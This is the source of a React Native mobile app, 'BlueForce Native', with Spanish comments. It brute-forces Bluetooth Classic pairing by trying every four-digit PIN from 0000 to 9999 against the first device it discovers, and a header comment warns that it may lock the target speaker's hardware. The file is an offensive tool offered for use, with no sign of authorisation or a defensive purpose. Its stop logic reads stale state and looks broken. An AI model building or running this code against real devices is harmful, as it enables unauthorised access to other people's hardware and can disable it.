import React, { useState, useEffect } from 'react';
import { StyleSheet, Text, View, TouchableOpacity, ScrollView, Alert } from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

/**
 * BlueForce Brute-Forcer Native Engine
 * ADVERTENCIA: Este software intentará 10,000 combinaciones de PIN.
 * Puede causar el bloqueo del hardware del parlante.
 */

export default function App() {
  const [device, setDevice] = useState(null);
  const [isBruting, setIsBruting] = useState(false);
  const [currentPin, setCurrentPin] = useState('0000');
  const [logs, setLogs] = useState([]);

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 50));
  };

  const startBruteForce = async () => {
    if (!device) {
      Alert.alert("Error", "Primero escanea y selecciona un dispositivo");
      return;
    }

    setIsBruting(true);
    addLog(`Iniciando ataque de fuerza bruta contra ${device.name}`);

    for (let i = 0; i <= 9999; i++) {
      if (!isBruting) break;

      const pin = i.toString().padStart(4, '0');
      setCurrentPin(pin);
      addLog(`Probando PIN: ${pin}...`);

      try {
        // Intentamos emparejar
        const connected = await RNBluetoothClassic.pairDevice(device.address, { pin });
        
        if (connected) {
          addLog(`🎯 ¡ÉXITO! Conectado con PIN: ${pin}`);
          setIsBruting(false);
          Alert.alert("¡CONSEGUIDO!", `El PIN correcto es: ${pin}`);
          break;
        }
      } catch (err) {
        // La mayoría fallarán. Esperamos un poco para no saturar el stack de Android
        await new Promise(r => setTimeout(r, 1500));
      }
    }
    setIsBruting(false);
  };

  const scanDevices = async () => {
    addLog("Buscando dispositivos...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      if (devices.length > 0) {
        setDevice(devices[0]); // Seleccionamos el primero por ahora para la demo
        addLog(`Detectado: ${devices[0].name}`);
      }
    } catch (err) {
      addLog(`Error de escaneo: ${err.message}`);
    }
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>BlueForce Native</Text>
      <View style={styles.radarContainer}>
        <Text style={styles.pinDisplay}>{currentPin}</Text>
        <Text style={styles.statusLabel}>{isBruting ? 'ATACANDO...' : 'SISTEMA LISTO'}</Text>
      </View>

      <TouchableOpacity 
        style={[styles.button, isBruting && styles.stopButton]} 
        onPress={isBruting ? () => setIsBruting(false) : startBruteForce}
      >
        <Text style={styles.buttonText}>{isBruting ? 'DETENER ATAQUE' : 'INICIAR FUERZA BRUTA'}</Text>
      </TouchableOpacity>

      <TouchableOpacity style={styles.scanButton} onPress={scanDevices}>
        <Text style={styles.buttonText}>ESCANEAR DISPOSITIVOS</Text>
      </TouchableOpacity>

      <ScrollView style={styles.logContainer}>
        {logs.map((log, i) => <Text key={i} style={styles.logText}>{log}</Text>)}
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#05070a', padding: 40, paddingTop: 60 },
  title: { fontSize: 32, fontWeight: 'bold', color: '#00f2ff', textAlign: 'center', marginBottom: 30 },
  radarContainer: { height: 200, width: 200, borderRadius: 100, borderWidth: 2, borderColor: '#00f2ff', alignSelf: 'center', justifyContent: 'center', alignItems: 'center', marginBottom: 40, backgroundColor: 'rgba(0, 242, 255, 0.05)' },
  pinDisplay: { fontSize: 48, fontWeight: 'bold', color: '#fff' },
  statusLabel: { color: '#00f2ff', fontSize: 12, marginTop: 10 },
  button: { backgroundColor: '#00f2ff', padding: 20, borderRadius: 15, alignItems: 'center', marginBottom: 15 },
  stopButton: { backgroundColor: '#ff0055' },
  scanButton: { backgroundColor: 'transparent', borderWidth: 1, borderColor: 'rgba(255,255,255,0.3)', padding: 15, borderRadius: 15, alignItems: 'center', marginBottom: 20 },
  buttonText: { fontWeight: 'bold', color: '#05070a' },
  logContainer: { flex: 1, backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 15, padding: 15 },
  logText: { color: '#888', fontSize: 11, fontFamily: 'monospace', marginBottom: 5 }
});
